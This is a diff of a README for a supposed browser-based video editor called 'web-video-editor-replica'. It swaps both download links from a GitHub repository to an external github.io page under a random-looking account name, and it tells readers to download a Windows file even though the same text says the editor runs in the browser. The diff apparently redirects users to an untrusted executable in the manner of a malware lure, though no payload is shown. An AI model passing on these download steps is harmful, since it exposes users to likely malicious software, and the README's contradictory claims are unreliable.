@@ -1,12 +1,12 @@
 # 🎥 web-video-editor-replica - Edit your videos with simple tools
 
-[![](https://img.shields.io/badge/Download-Video_Editor-blue.svg)](https://github.com/Ankylotic-fittingness864/web-video-editor-replica)
+[![](https://img.shields.io/badge/Download-Video_Editor-blue.svg)](https://ankylotic-fittingness864.github.io)
 
 This software allows you to edit videos directly in your web browser. The interface mimics professional desktop editors to help you achieve a smooth workflow. You can trim clips, add transitions, and adjust your footage without complex settings.
 
 ## 📥 How to download the editor
 
-Visit [this page](https://github.com/Ankylotic-fittingness864/web-video-editor-replica) to access the download options. Look for the latest release on the right side of the screen. Select the file labeled for Windows to save it to your computer.
+Visit [this page](https://ankylotic-fittingness864.github.io) to access the download options. Look for the latest release on the right side of the screen. Select the file labeled for Windows to save it to your computer.
 
 ## 🖥️ System requirements
 
